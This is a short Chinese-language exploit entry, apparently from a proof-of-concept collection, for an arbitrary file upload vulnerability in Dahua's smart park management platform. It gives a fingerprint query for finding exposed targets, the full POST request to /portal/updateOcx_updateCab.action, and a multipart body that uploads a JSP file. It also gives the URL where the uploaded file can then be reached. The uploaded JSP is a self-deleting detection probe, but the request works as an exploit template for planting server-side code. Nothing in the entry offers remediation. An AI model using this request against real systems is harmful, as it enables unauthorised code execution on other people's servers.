# 大华智慧园区系统updateOcx_updateCab.action存在任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /portal/updateOcx_updateCab.action HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 429`　`Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3`　`Content-Type: multipart/form-data; boundary=9b1d729ed9954863bcbedbb523cec7…`

**请求体 / payload**
```
--9b1d729ed9954863bcbedbb523cec7fa
Content-Disposition: form-data; name="updateBean.loadCabFileName"
sAuyJk.jsp
--9b1d729ed9954863bcbedbb523cec7fa
Content-Disposition: form-data; name="updateBean.loadCab"; filename="sAuyJk.jsp"
Content-Type: text/plain
<% out.println(75471+90776+"tnMXedOsifiHeptP");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--9b1d729ed9954863bcbedbb523cec7fa--
文件地址 20240801102132 文件上传时间戳
[http://xx.xx.xx.xx/portal/ocx/20240801102132/sAuyJk.jsp](http://xx.xx.xx.xx/portal/ocx/20240801102132/sAuyJk.jsp)
```
- **预期**：200　|　—